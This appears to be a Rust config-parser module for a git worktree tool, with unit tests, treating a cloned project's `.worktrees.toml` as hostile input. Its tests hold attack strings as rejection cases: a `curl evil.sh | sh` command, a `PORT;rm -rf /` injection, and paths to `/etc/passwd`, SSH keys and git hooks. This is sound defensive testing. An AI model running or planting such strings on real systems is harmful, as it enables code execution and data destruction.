//! `.worktrees.toml` — the per-project, committed config (proposal §3).
//!
//! ⚠ THE INVARIANT, which is invisible from any single line below: `RelPath`'s
//! field is PRIVATE and `RelPath::parse` is its ONLY constructor. There is no
//! `From<String>`, no `Deref<Target = str>`, no `AsRef<Path>`, no `new`. The
//! file list deserializes THROUGH `parse`, so a `ProjectConfig` holding a path
//! that failed Layer A is *unconstructible* — every consumer is forced through
//! validation by the type system rather than reminded to call it in a comment.
//! Keep it that way: adding any of those impls silently deletes the boundary.
//!
//! `.worktrees.toml` arrives with a `git clone`, so it is hostile input (§4).
//! Layer A (this module) is the literal-string pass: it rejects early with a
//! `file:line:` message. Layer B (resolved paths, at apply time) is the actual
//! containment boundary and lands with `materialize.rs`.
//!
//! `parse` is pure — no filesystem, no clock, no env. `load` is the one impure
//! entry point, and it returns `Ok((None, _))` when the file is absent. That
//! absence path is what makes principle §2.4 true: a repo with no
//! `.worktrees.toml` behaves byte-identically to a build without this module.

use crate::diag::{Code, Finding};
use crate::error::WtError;
use serde::{Deserialize, Deserializer};
use std::collections::BTreeMap;
use std::fmt;
use std::path::Path;
use toml::de::{DeTable, DeValue};
use toml::Spanned;

/// The project config's fixed name. Tool-owned, like `.worktrees.places.json`.
pub const CONFIG_FILE: &str = ".worktrees.toml";

/// §4: a declared path is at most 1 KiB, and there are at most 256 of them.
const MAX_PATH_BYTES: usize = 1024;
const MAX_ENTRIES: usize = 256;

/// §6 defaults, applied when `[ports]` omits them.
const DEFAULT_STRIDE: u32 = 100;
const DEFAULT_MAX_SLOTS: u32 = 50;

/// Keys a project may NEVER set (§5). Anything that becomes argv, or names a
/// program to run, is user-scoped permanently — a cloned repo writing the
/// tool's command line is the one thing this design refuses to allow.
const USER_ONLY_KEYS: &[&str] =
    &["ai_cmd", "ai_resume_arg", "post_create", "hooks", "infra", "install_cmd", "no_install"];

// ── errors ───────────────────────────────────────────────────────────────────

/// A fatal config problem. Its own type rather than `WtError` because it carries
/// a line number and no exit code: it is a *diagnostic* until a caller decides
/// what to do with it. Converts into `WtError` (exit 1, guard) for op callers.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CfgError {
    /// 1-based line in `.worktrees.toml`, when the parser could pin one down.
    pub line: Option<u32>,
    /// The bare message, with no `file:line:` prefix — `Display` adds that, so
    /// the message can also be handed to serde as a custom error and re-located
    /// later without the prefix appearing twice.
    pub message: String,
}

impl CfgError {
    pub fn msg(message: impl Into<String>) -> Self {
        CfgError { line: None, message: message.into() }
    }
    pub fn at(line: u32, message: impl Into<String>) -> Self {
        CfgError { line: Some(line), message: message.into() }
    }
    /// Attach a location to an error raised by a pure helper that had no text
    /// to point at (`RelPath::parse`, `lint_ports`).
    pub fn with_line(mut self, line: u32) -> Self {
        self.line = Some(line);
        self
    }
}

impl fmt::Display for CfgError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self.line {
            Some(l) => write!(f, "{CONFIG_FILE}:{l}: {}", self.message),
            None => write!(f, "{CONFIG_FILE}: {}", self.message),
        }
    }
}

impl std::error::Error for CfgError {}

impl From<CfgError> for WtError {
    fn from(e: CfgError) -> Self {
        WtError::new(e.to_string())
    }
}

// ── RelPath — Layer A ────────────────────────────────────────────────────────

/// A repo-relative path that has passed Layer A (§4). See the module invariant.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RelPath(String);

impl RelPath {
    /// The ONLY constructor. Every rule here is from §4; a failure rejects the
    /// whole config, because partial application is how you get a
    /// half-provisioned worktree.
    pub fn parse(s: &str) -> Result<RelPath, CfgError> {
        if s.is_empty() {
            return Err(CfgError::msg("empty path"));
        }
        if s.len() > MAX_PATH_BYTES {
            return Err(CfgError::msg(format!(
                "path is {} bytes, over the {MAX_PATH_BYTES}-byte limit",
                s.len()
            )));
        }
        if s.contains('\0') {
            return Err(CfgError::msg("NUL byte in path"));
        }
        if s.starts_with('/') {
            return Err(CfgError::msg(format!("absolute path not allowed: {s}")));
        }
        if s.starts_with('~') {
            // No expansion is performed anywhere, so this would quietly become a
            // literal directory named `~` rather than the home directory.
            return Err(CfgError::msg(format!("`~` is not expanded, so it cannot start a path: {s}")));
        }
        if s.contains('$') {
            // Rejected even mid-path: no env expansion is performed, and this
            // keeps the door shut on ever adding it.
            return Err(CfgError::msg(format!("`$` is not expanded and is not allowed in a path: {s}")));
        }
        // Split on `/` ONLY. macOS and Linux are the only shipped targets
        // (release.yml:18-21), so `\` is an ordinary filename byte here —
        // treating it as a separator would make a legitimately-named file
        // unlinkable.
        for c in s.split('/') {
            if c.is_empty() {
                return Err(CfgError::msg(format!("empty path component in: {s}")));
            }
            if c == "." || c == ".." {
                return Err(CfgError::msg(format!("`{c}` path component not allowed: {s}")));
            }
            // A NAME rule, not a containment rule — and it has to be. Layer B's
            // "is it inside the repo?" check PASSES for `.git/hooks/pre-commit`,
            // which is inside the repo and is also code execution on the
            // victim's next commit. Case-insensitive because macOS would open
            // `.GIT` as `.git`.
            if c.eq_ignore_ascii_case(".git") {
                return Err(CfgError::msg(format!("`.git` is never linkable (component `{c}`): {s}")));
            }
        }
        if s.split('/').next() == Some(".worktrees") {
            return Err(CfgError::msg(format!("`.worktrees/` is the tool's own tree: {s}")));
        }
        if s == CONFIG_FILE || s == ".worktrees.places.json" {
            return Err(CfgError::msg(format!("a config file cannot declare itself: {s}")));
        }
        Ok(RelPath(s.to_string()))
    }

    /// Read access. An explicit method, not `Deref`/`AsRef`, so that reaching
    /// for the string is always a visible act at the call site.
    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// Case-folded key for the case-only-duplicate check (§4): `Foo/.env` and
    /// `foo/.env` are one file on macOS and two in Linux CI, and that divergence
    /// must be a config error rather than a race.
    fn fold_key(&self) -> String {
        self.0.to_lowercase()
    }
}

impl<'de> Deserialize<'de> for RelPath {
    fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        let s = String::deserialize(d)?;
        // `message` (not `to_string`) — the toml deserializer re-locates this
        // error onto the offending value's span, and `parse` had no line to add.
        RelPath::parse(&s).map_err(|e| serde::de::Error::custom(e.message))
    }
}

// ── the config ───────────────────────────────────────────────────────────────

/// Per-entry mode. `link` is the default: ONE source of truth, because a
/// per-worktree copy drifts (§3).
#[derive(Deserialize, Clone, Copy, Debug, Default, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum Mode {
    #[default]
    Link,
    Copy,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct FileEntry {
    pub path: RelPath,
    pub mode: Mode,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Ports {
    pub stride: u32,
    pub max_slots: u32,
    pub base: BTreeMap<String, u32>,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Compose {
    pub file: RelPath,
    /// A template over the CLOSED placeholder set `{prefix}` / `{slug}` (§5).
    /// Validated here, expanded later — this module never touches a `Project`.
    pub project: String,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct ProjectConfig {
    pub files: Vec<FileEntry>,
    pub ports: Option<Ports>,
    pub compose: Option<Compose>,
}

// ── the wire shapes (spans attached) ─────────────────────────────────────────
// Deserialized into, then validated into the public types above. `Spanned` is
// how list-level rules (duplicates, entry count) still get a line number: the
// per-value errors are located by toml itself, but "these two entries collide"
// is only knowable after both exist.

#[derive(Deserialize)]
struct RawFile {
    path: Spanned<RelPath>,
    #[serde(default)]
    mode: Mode,
}

#[derive(Deserialize)]
struct RawPorts {
    #[serde(default = "default_stride")]
    stride: u32,
    #[serde(default = "default_max_slots")]
    max_slots: u32,
    /// Required: a `[ports]` section with nothing to offset is a typo, not a
    /// configuration.
    base: BTreeMap<String, u32>,
}

fn default_stride() -> u32 {
    DEFAULT_STRIDE
}
fn default_max_slots() -> u32 {
    DEFAULT_MAX_SLOTS
}

#[derive(Deserialize)]
struct RawCompose {
    file: Spanned<RelPath>,
    project: Spanned<String>,
}

#[derive(Deserialize)]
struct RawConfig {
    #[serde(rename = "file", default)]
    files: Vec<RawFile>,
    #[serde(default)]
    ports: Option<Spanned<RawPorts>>,
    #[serde(default)]
    compose: Option<RawCompose>,
    // `project` is handled by the survey pass — §12 defers `[project] prefix`
    // out of v1, so it is warned about rather than stored.
}

// ── parse ────────────────────────────────────────────────────────────────────

/// Parse `.worktrees.toml`'s text. PURE: no filesystem, no env, no clock.
///
/// Two passes over the same text, deliberately. The first walks the raw spanned
/// document (`DeTable`) to answer the *precedence* question (§5) — who is
/// allowed to write this key — because a project that sets `ai_cmd` must be told
/// exactly that, not "unknown field `ai_cmd`", and because serde's typed pass
/// discards unknown keys without a word. The second is the typed parse.
pub fn parse(text: &str) -> Result<(ProjectConfig, Vec<Finding>), CfgError> {
    let mut findings = Vec::new();

    // Pass 1 — precedence guard + forward-compat warnings.
    let doc = DeTable::parse(text).map_err(|e| toml_err(text, &e))?;
    survey(text, doc.get_ref(), &mut findings)?;

    // Pass 2 — the typed parse. Every `RelPath` here has already been through
    // Layer A; there is no path in this struct that has not.
    let raw: RawConfig = toml::from_str(text).map_err(|e| toml_err(text, &e))?;

    let files = check_file_list(text, raw.files)?;

    let ports = match raw.ports {
        Some(sp) => {
            let line = line_of(text, sp.span().start);
            let p = sp.into_inner();
            let ports = Ports { stride: p.stride, max_slots: p.max_slots, base: p.base };
            lint_ports(&ports).map_err(|e| e.with_line(line))?;
            Some(ports)
        }
        None => None,
    };

    let compose = match raw.compose {
        Some(c) => {
            let line = line_of(text, c.project.span().start);
            let project = c.project.into_inner();
            check_project_template(&project).map_err(|e| e.with_line(line))?;
            Some(Compose { file: c.file.into_inner(), project })
        }
        None => None,
    };

    Ok((ProjectConfig { files, ports, compose }, findings))
}

/// Read `<main_root>/.worktrees.toml`. `Ok((None, vec![]))` when it is absent —
/// the byte-identical-behavior guarantee (§2.4) lives on this line.
pub fn load(main_root: &Path) -> Result<(Option<ProjectConfig>, Vec<Finding>), CfgError> {
    let path = main_root.join(CONFIG_FILE);
    let text = match std::fs::read_to_string(&path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok((None, Vec::new())),
        // Present but unreadable is NOT the absent case: silently proceeding
        // would half-provision, which §1 says is worse than not provisioning.
        Err(e) => return Err(CfgError::msg(format!("cannot read {}: {e}", path.display()))),
    };
    let (cfg, findings) = parse(&text)?;
    Ok((Some(cfg), findings))
}

// ── validation helpers (pure, individually tested) ───────────────────────────

/// §5's allow-list, complemented. `install_cmd*` is a prefix match so a future
/// per-ecosystem override (`install_cmd_pnpm`) is refused on arrival rather than
/// after someone ships it.
fn is_user_only(key: &str) -> bool {
    USER_ONLY_KEYS.contains(&key) || key.starts_with("install_cmd")
}

fn user_only_message(key: &str) -> String {
    format!(
        "{key} may not be set by a project — this is a user setting \
         (~/.config/worktrees/config.toml)"
    )
}

/// Walk the raw document scope by scope. Every scope has a CLOSED known-key set,
/// so a key is exactly one of: expected, user-only (hard error), or unknown
/// (warn + ignore). Serde alone cannot do this — `deny_unknown_fields` would
/// turn a forward-compat key into a fatal, and the default silently drops it.
fn survey(text: &str, root: &DeTable, findings: &mut Vec<Finding>) -> Result<(), CfgError> {
    survey_keys(text, root, "", &["file", "ports", "compose", "project"], findings)?;
    for (key, val) in root.iter() {
        match (key.get_ref().as_ref(), val.get_ref()) {
            ("file", DeValue::Array(entries)) => {
                for e in entries {
                    if let DeValue::Table(t) = e.get_ref() {
                        survey_keys(text, t, "file", &["path", "mode"], findings)?;
                    }
                }
            }
            ("ports", DeValue::Table(t)) => {
                // NOT descending into `base`: its keys are the project's own
                // service names, not this schema's vocabulary.
                survey_keys(text, t, "ports", &["stride", "max_slots", "base"], findings)?;
            }
            ("compose", DeValue::Table(t)) => {
                survey_keys(text, t, "compose", &["file", "project"], findings)?;
            }
            ("project", DeValue::Table(t)) => survey_project(text, t, findings)?,
            // Wrong-shaped values (`file = 1`) fall through to the typed pass,
            // which names the expected type far better than this walk could.
            _ => {}
        }
    }
    Ok(())
}

fn survey_keys(
    text: &str,
    table: &DeTable,
    scope: &str,
    known: &[&str],
    findings: &mut Vec<Finding>,
) -> Result<(), CfgError> {
    for (key, _) in table.iter() {
        let name = key.get_ref().as_ref();
        let line = line_of(text, key.span().start);
        // A user-only key is refused wherever it appears — not just at the top
        // level. Silent ignore trains people to write it, and eventually someone
        // "fixes" the ignore (§5).
        if is_user_only(name) {
            return Err(CfgError::at(line, user_only_message(name)));
        }
        if !known.contains(&name) {
            findings.push(Finding::warn(
                Code::UnknownKey,
                format!("{CONFIG_FILE}:{line}: unknown key `{}` — ignored", qualify(scope, name)),
            ));
        }
    }
    Ok(())
}

fn qualify(scope: &str, name: &str) -> String {
    if scope.is_empty() {
        name.to_string()
    } else {
        format!("{scope}.{name}")
    }
}

/// `[project]` exists in the schema but §12 defers its only key out of v1, so it
/// parses and warns rather than silently doing nothing.
fn survey_project(text: &str, table: &DeTable, findings: &mut Vec<Finding>) -> Result<(), CfgError> {
    for (key, _) in table.iter() {
        let name = key.get_ref().as_ref();
        let line = line_of(text, key.span().start);
        if is_user_only(name) {
            return Err(CfgError::at(line, user_only_message(name)));
        }
        findings.push(if name == "prefix" {
            Finding::warn(
                Code::DeferredKey,
                format!(
                    "{CONFIG_FILE}:{line}: `[project] prefix` is parsed but not yet honored \
                     (deferred to v3 — changing a prefix renames every live tmux session)"
                ),
            )
        } else {
            Finding::warn(
                Code::UnknownKey,
                format!("{CONFIG_FILE}:{line}: unknown key `project.{name}` — ignored"),
            )
        });
    }
    Ok(())
}

/// List-level Layer-A rules: entry count, exact duplicates, case-only
/// duplicates. Per-entry rules already ran inside `RelPath::parse`.
fn check_file_list(text: &str, raw: Vec<RawFile>) -> Result<Vec<FileEntry>, CfgError> {
    if raw.len() > MAX_ENTRIES {
        let line = raw.get(MAX_ENTRIES).map(|f| line_of(text, f.path.span().start));
        let e = CfgError::msg(format!("{} file entries, over the {MAX_ENTRIES} limit", raw.len()));
        return Err(match line {
            Some(l) => e.with_line(l),
            None => e,
        });
    }
    let mut seen: BTreeMap<String, String> = BTreeMap::new();
    let mut out = Vec::with_capacity(raw.len());
    for f in raw {
        let line = line_of(text, f.path.span().start);
        let path = f.path.into_inner();
        if let Some(first) = seen.insert(path.fold_key(), path.as_str().to_string()) {
            return Err(CfgError::at(
                line,
                if first == path.as_str() {
                    format!("duplicate path: {}", path.as_str())
                } else {
                    format!(
                        "case-only duplicate: `{}` and `{first}` are one file on macOS and two on Linux",
                        path.as_str()
                    )
                },
            ));
        }
        out.push(FileEntry { path, mode: f.mode });
    }
    Ok(out)
}

/// `[compose] project` is a template over a CLOSED placeholder set (§5), not a
/// free string. Validated here so a typo (`{branch}`) fails at parse time rather
/// than reaching `docker -p` as a literal brace.
fn check_project_template(t: &str) -> Result<(), CfgError> {
    let mut rest = t;
    while let Some(i) = rest.find('{') {
        let after = &rest[i + 1..];
        let Some(j) = after.find('}') else {
            return Err(CfgError::msg(format!("unterminated `{{` in [compose] project: {t}")));
        };
        let name = &after[..j];
        if name != "prefix" && name != "slug" {
            return Err(CfgError::msg(format!(
                "unknown placeholder `{{{name}}}` in [compose] project — only {{prefix}} and {{slug}} are allowed"
            )));
        }
        rest = &after[j + 1..];
    }
    Ok(())
}

/// §6's free parse-time lint. With a shared stride, services *i* and *j* collide
/// at some slot iff `(bᵢ − bⱼ) % stride == 0` and `|bᵢ − bⱼ| ≤ stride × max_slots`
/// — so the whole class of "worktree 3's API port is worktree 1's Postgres port"
/// is a pure function over the declared map, catchable before a single port is
/// ever bound.
pub fn lint_ports(p: &Ports) -> Result<(), CfgError> {
    if p.stride < 1 {
        return Err(CfgError::msg("[ports] stride must be at least 1"));
    }
    if p.max_slots < 1 {
        return Err(CfgError::msg("[ports] max_slots must be at least 1"));
    }
    if p.base.is_empty() {
        return Err(CfgError::msg("[ports] base declares no ports"));
    }
    // Every base key becomes a `<NAME>_PORT=<n>` line in `.worktree.env`, and §3
    // records that consumers read that file with `set -a; . .worktree.env` — it is
    // SOURCED AS SHELL, not parsed. So a key must be a valid POSIX shell name;
    // anything else emits a line that either fails to assign or executes.
    for name in p.base.keys() {
        let mut cs = name.chars();
        let ok = match cs.next() {
            Some(c) if c.is_ascii_alphabetic() || c == '_' => {
                cs.all(|c| c.is_ascii_alphanumeric() || c == '_')
            }
            _ => false,
        };
        if !ok {
            return Err(CfgError::msg(format!(
                "[ports] base key `{name}` is not a shell-safe name — it is sourced from \
                 .worktree.env, so it must match [A-Za-z_][A-Za-z0-9_]*"
            )));
        }
    }
    let entries: Vec<(&String, u32)> = p.base.iter().map(|(k, v)| (k, *v)).collect();
    for i in 0..entries.len() {
        for j in (i + 1)..entries.len() {
            let (an, a) = entries[i];
            let (bn, b) = entries[j];
            if a == b {
                return Err(CfgError::msg(format!("[ports] base {an} and {bn} share port {a}")));
            }
            let diff = u64::from(a.abs_diff(b));
            if diff % u64::from(p.stride) == 0 && diff <= u64::from(p.stride) * u64::from(p.max_slots) {
                return Err(CfgError::msg(format!(
                    "[ports] base {an}={a} and {bn}={b} differ by a multiple of stride {} \
                     within {} slots — they would collide across worktrees",
                    p.stride, p.max_slots
                )));
            }
        }
    }
    let max = entries.iter().map(|(_, v)| u64::from(*v)).max().unwrap_or(0);
    let top = max + u64::from(p.stride) * u64::from(p.max_slots);
    if top >= 65536 {
        return Err(CfgError::msg(format!(
            "[ports] highest slot would reach {top}, past the 65535 port ceiling \
             (max base {max} + stride {} × max_slots {})",
            p.stride, p.max_slots
        )));
    }
    Ok(())
}

// ── span → line ──────────────────────────────────────────────────────────────

/// Byte offset → 1-based line. `toml` hands back byte spans; `.worktrees.toml`
/// is the one file where a diagnostic pointing at a line is worth the parser.
fn line_of(text: &str, offset: usize) -> u32 {
    let end = offset.min(text.len());
    text.as_bytes()[..end].iter().filter(|&&b| b == b'\n').count() as u32 + 1
}

/// A `toml` error, re-rendered as `.worktrees.toml:<line>: <message>`. `message()`
/// rather than `Display` because `Display` prints a multi-line caret diagram that
/// does not belong in a one-line `error()` call.
fn toml_err(text: &str, e: &toml::de::Error) -> CfgError {
    match e.span() {
        Some(s) => CfgError::at(line_of(text, s.start), e.message()),
        None => CfgError::msg(e.message()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::diag::Severity;

    fn err(s: &str) -> String {
        RelPath::parse(s).unwrap_err().to_string()
    }
    fn ok(s: &str) -> RelPath {
        RelPath::parse(s).unwrap_or_else(|e| panic!("{s} should parse: {e}"))
    }

    // ── Layer A, per entry ───────────────────────────────────────────────────

    #[test]
    fn layer_a_accepts_ordinary_repo_relative_paths() {
        assert_eq!(ok(".env").as_str(), ".env");
        assert_eq!(ok("apps/mobile/google-services.json").as_str(), "apps/mobile/google-services.json");
        // `.gitignore` is not `.git`: the component rule is exact-name, not prefix
        assert_eq!(ok(".gitignore").as_str(), ".gitignore");
        assert_eq!(ok("a/.gitmodules").as_str(), "a/.gitmodules");
        // not a first component, so allowed
        assert_eq!(ok("sub/.worktrees").as_str(), "sub/.worktrees");
    }

    #[test]
    fn backslash_is_an_ordinary_filename_byte_not_a_separator() {
        // macOS and Linux are the only shipped targets (release.yml:18-21), so a
        // file literally named `a\b.env` is legal and must stay linkable. If `\`
        // were treated as a separator this string would split into components
        // and the path would be unusable.
        let p = ok(r"a\b.env");
        assert_eq!(p.as_str(), r"a\b.env");
        assert_eq!(p.as_str().split('/').count(), 1, "must be ONE component");
        // and it is still subject to every other rule
        assert!(err(r"a\b/../c").contains("`..`"));
    }

    #[test]
    fn layer_a_rejects_absolute_tilde_and_dollar() {
        assert!(err("/etc/passwd").contains("absolute path not allowed: /etc/passwd"));
        assert!(err("~/.ssh/id_rsa").contains("`~` is not expanded"));
        assert!(err("~").contains("`~` is not expanded"));
        assert!(err("$HOME/.env").contains("`$` is not expanded"));
        assert!(err("a/$X/b").contains("`$` is not expanded"));
    }

    #[test]
    fn layer_a_rejects_traversal_and_empty_components() {
        assert!(err("../outside/.env").contains("`..`"));
        assert!(err("a/../b").contains("`..`"));
        assert!(err("./a").contains("`.` path component"));
        assert!(err("a/./b").contains("`.` path component"));
        assert!(err("a//b").contains("empty path component"));
        assert!(err("a/").contains("empty path component"));
        assert!(err("").contains("empty path"));
    }

    #[test]
    fn layer_a_rejects_dot_git_in_every_casing() {
        // NAME rule: `.git/hooks/pre-commit` IS inside the repo, so containment
        // never catches it — and linking it is code execution on next commit.
        for s in [".git/hooks/pre-commit", ".GIT/config", ".Git/hooks/pre-push", "a/.git/x", "a/.GiT/x"] {
            assert!(err(s).contains("`.git` is never linkable"), "{s} must be rejected");
        }
    }

    #[test]
    fn layer_a_rejects_the_tools_own_files() {
        assert!(err(".worktrees/feat/.env").contains("`.worktrees/`"));
        assert!(err(".worktrees").contains("`.worktrees/`"));
        assert!(err(".worktrees.toml").contains("cannot declare itself"));
        assert!(err(".worktrees.places.json").contains("cannot declare itself"));
    }

    #[test]
    fn layer_a_rejects_nul_and_over_length() {
        assert!(err("a\0b").contains("NUL byte"));
        // and via the parser, where TOML's ` ` escape is the delivery vector
        assert!(parse("[[file]]\npath = \"a\\u0000b\"\n").is_err());
        let long = format!("{}.env", "a".repeat(MAX_PATH_BYTES));
        assert!(err(&long).contains("over the 1024-byte limit"));
        // exactly at the limit is fine
        assert!(RelPath::parse(&"a".repeat(MAX_PATH_BYTES)).is_ok());
    }

    // ── Layer A, list level ──────────────────────────────────────────────────

    #[test]
    fn duplicate_and_case_only_duplicate_paths_are_rejected() {
        let e = parse("[[file]]\npath = \".env\"\n\n[[file]]\npath = \".env\"\n").unwrap_err();
        assert_eq!(e.to_string(), ".worktrees.toml:5: duplicate path: .env");

        let e = parse("[[file]]\npath = \"Foo/.env\"\n\n[[file]]\npath = \"foo/.env\"\n").unwrap_err();
        assert!(e.to_string().contains("case-only duplicate"), "{e}");
        assert_eq!(e.line, Some(5));
    }

    #[test]
    fn over_the_entry_limit_is_rejected() {
        let mut t = String::new();
        for i in 0..=MAX_ENTRIES {
            t.push_str(&format!("[[file]]\npath = \"f{i}.env\"\n"));
        }
        let e = parse(&t).unwrap_err();
        assert!(e.to_string().contains("over the 256 limit"), "{e}");
    }

    // ── errors carry line numbers ────────────────────────────────────────────

    #[test]
    fn error_messages_are_prefixed_with_file_and_line() {
        let text = "# a comment\n# another\n\n[[file]]\npath = \".env\"\n\n[[file]]\npath = \"/etc/passwd\"\n";
        let e = parse(text).unwrap_err();
        assert_eq!(e.to_string(), ".worktrees.toml:8: absolute path not allowed: /etc/passwd");

        // a syntax error is located too
        let e = parse("[[file]]\npath = \".env\"\nmode = \n").unwrap_err();
        assert_eq!(e.line, Some(3), "{e}");

        // a path error with no text to point at renders without a line
        assert_eq!(err("/x"), ".worktrees.toml: absolute path not allowed: /x");
    }

    // ── [compose] ────────────────────────────────────────────────────────────

    #[test]
    fn compose_file_gets_the_same_layer_a_rules() {
        for bad in ["/etc/passwd", "~/x.yml", "$X.yml", "../x.yml", ".git/x", ".worktrees/x.yml"] {
            let t = format!("[compose]\nfile = \"{bad}\"\nproject = \"p\"\n");
            assert!(parse(&t).is_err(), "[compose] file = {bad} must be rejected");
        }
        let (c, _) = parse("[compose]\nfile = \"docker-compose.worktree.yml\"\nproject = \"p\"\n").unwrap();
        assert_eq!(c.compose.unwrap().file.as_str(), "docker-compose.worktree.yml");
    }

    #[test]
    fn compose_project_template_has_a_closed_placeholder_set() {
        let good = "[compose]\nfile = \"c.yml\"\nproject = \"{prefix}-wt-{slug}\"\n";
        let (c, _) = parse(good).unwrap();
        assert_eq!(c.compose.unwrap().project, "{prefix}-wt-{slug}");
        // no placeholders at all is fine
        assert!(parse("[compose]\nfile = \"c.yml\"\nproject = \"static\"\n").is_ok());

        let e = parse("[compose]\nfile = \"c.yml\"\nproject = \"{prefix}-{branch}\"\n").unwrap_err();
        assert!(e.to_string().contains("unknown placeholder `{branch}`"), "{e}");
        assert_eq!(e.line, Some(3));

        let e = parse("[compose]\nfile = \"c.yml\"\nproject = \"{prefix\"\n").unwrap_err();
        assert!(e.to_string().contains("unterminated"), "{e}");
    }

    // ── [ports] ──────────────────────────────────────────────────────────────

    fn ports(stride: u32, max_slots: u32, base: &[(&str, u32)]) -> Ports {
        Ports {
            stride,
            max_slots,
            base: base.iter().map(|(k, v)| (k.to_string(), *v)).collect(),
        }
    }

    #[test]
    fn port_lint_rejects_bases_that_collide_across_slots() {
        // 3000 and 3100 differ by exactly one stride: worktree slot 1's
        // BACKOFFICE is worktree slot 0's API.
        let e = lint_ports(&ports(100, 50, &[("A", 3000), ("B", 3100)])).unwrap_err();
        assert!(e.message.contains("would collide"), "{e}");
        // a multiple of stride, still inside the reachable window
        assert!(lint_ports(&ports(100, 50, &[("A", 3000), ("B", 5000)])).is_err());
        // same delta but OUTSIDE the reachable window (> stride * max_slots)
        assert!(lint_ports(&ports(100, 5, &[("A", 3000), ("B", 5000)])).is_ok());
        // not a multiple of the stride → never collides
        assert!(lint_ports(&ports(100, 50, &[("A", 3000), ("B", 3001), ("C", 3010)])).is_ok());
    }

    #[test]
    fn port_lint_requires_distinct_bases() {
        let e = lint_ports(&ports(100, 50, &[("A", 3000), ("B", 3000)])).unwrap_err();
        assert!(e.message.contains("share port 3000"), "{e}");
    }

    #[test]
    fn port_lint_enforces_the_65536_ceiling() {
        // 60000 + 100*50 = 65000 → fits
        assert!(lint_ports(&ports(100, 50, &[("A", 60000)])).is_ok());
        // 60000 + 100*56 = 65600 → past the ceiling
        let e = lint_ports(&ports(100, 56, &[("A", 60000)])).unwrap_err();
        assert!(e.message.contains("65535 port ceiling"), "{e}");
    }

    #[test]
    fn port_lint_requires_shell_safe_base_names() {
        // `.worktree.env` is `set -a; . `-sourced by its consumers (§3), so a base
        // key is a shell variable name — not free text.
        for bad in ["MY PORT", "A=B", "2FAST", "", "A-B", "PORT;rm -rf /", "PÖRT"] {
            let e = lint_ports(&ports(100, 50, &[(bad, 3000)])).unwrap_err();
            assert!(e.message.contains("not a shell-safe name"), "{bad}: {e}");
        }
        for ok in ["API", "_X", "WO_MOCK", "a1"] {
            assert!(lint_ports(&ports(100, 50, &[(ok, 3000)])).is_ok(), "{ok}");
        }
        // and it fails the whole parse, with a line
        let e = parse("[ports]\nbase = { \"MY PORT\" = 3000 }\n").unwrap_err();
        assert_eq!(e.line, Some(1));
        assert!(e.message.contains("not a shell-safe name"), "{e}");
    }

    #[test]
    fn port_lint_requires_stride_and_max_slots_of_at_least_one() {
        assert!(lint_ports(&ports(0, 50, &[("A", 3000)])).unwrap_err().message.contains("stride"));
        assert!(lint_ports(&ports(100, 0, &[("A", 3000)])).unwrap_err().message.contains("max_slots"));
        assert!(lint_ports(&ports(1, 1, &[("A", 3000)])).is_ok());
    }

    #[test]
    fn ports_defaults_apply_and_base_is_required() {
        let (c, _) = parse("[ports]\nbase = { A = 3000, B = 3001 }\n").unwrap();
        let p = c.ports.unwrap();
        assert_eq!((p.stride, p.max_slots), (100, 50));

        let e = parse("[ports]\nstride = 100\n").unwrap_err();
        assert!(e.to_string().contains("missing field `base`"), "{e}");
    }

    #[test]
    fn a_colliding_port_map_fails_the_whole_parse_with_a_line() {
        let e = parse("[[file]]\npath = \".env\"\n\n[ports]\nbase = { A = 3000, B = 3100 }\n").unwrap_err();
        assert_eq!(e.line, Some(4), "{e}");
        assert!(e.to_string().starts_with(".worktrees.toml:4: [ports]"), "{e}");
    }

    // ── precedence guards (§5) ───────────────────────────────────────────────

    #[test]
    fn a_user_only_key_is_a_hard_error_that_points_at_the_user_config() {
        let e = parse("ai_cmd = \"curl evil.sh | sh\"\n").unwrap_err();
        assert_eq!(
            e.to_string(),
            ".worktrees.toml:1: ai_cmd may not be set by a project — this is a user setting \
             (~/.config/worktrees/config.toml)"
        );
        for k in ["ai_resume_arg = \"x\"", "post_create = \"x\"", "install_cmd = \"x\"", "install_cmd_pnpm = \"x\"", "no_install = true"] {
            let e = parse(&format!("{k}\n\n[[file]]\npath = \".env\"\n")).unwrap_err();
            assert!(e.message.contains("may not be set by a project"), "{k}: {e}");
            assert_eq!(e.line, Some(1), "{k}");
        }
        for t in ["[hooks]\npost_create = \"x\"\n", "[infra]\nup = \"docker compose up\"\n"] {
            let e = parse(t).unwrap_err();
            assert!(e.message.contains("may not be set by a project"), "{t}: {e}");
            assert_eq!(e.line, Some(1));
        }
        // and NOT only at the top level — a user-only key smuggled into any
        // section is refused with the same message
        let e = parse("[[file]]\npath = \".env\"\nai_cmd = \"x\"\n").unwrap_err();
        assert_eq!(e.line, Some(3), "{e}");
        assert!(e.message.starts_with("ai_cmd may not be set by a project"), "{e}");
        let e = parse("[project]\npost_create = \"x\"\n").unwrap_err();
        assert_eq!(e.line, Some(2), "{e}");
    }

    #[test]
    fn an_unknown_key_warns_and_the_config_still_parses() {
        let (c, f) = parse("future_thing = 1\n\n[[file]]\npath = \".env\"\n").unwrap();
        assert_eq!(c.files.len(), 1);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Warn);
        assert_eq!(f[0].code, Code::UnknownKey);
        assert_eq!(f[0].message, ".worktrees.toml:1: unknown key `future_thing` — ignored");
    }

    #[test]
    fn unknown_keys_inside_a_section_warn_with_their_scope() {
        let text = "[[file]]\npath = \".env\"\nbogus = 1\n\n[ports]\nbase = { A = 3000 }\nextra = 2\n";
        let (c, f) = parse(text).unwrap();
        assert_eq!(c.files.len(), 1);
        assert!(c.ports.is_some());
        let msgs: Vec<&str> = f.iter().map(|x| x.message.as_str()).collect();
        assert_eq!(
            msgs,
            vec![
                ".worktrees.toml:3: unknown key `file.bogus` — ignored",
                ".worktrees.toml:7: unknown key `ports.extra` — ignored",
            ]
        );
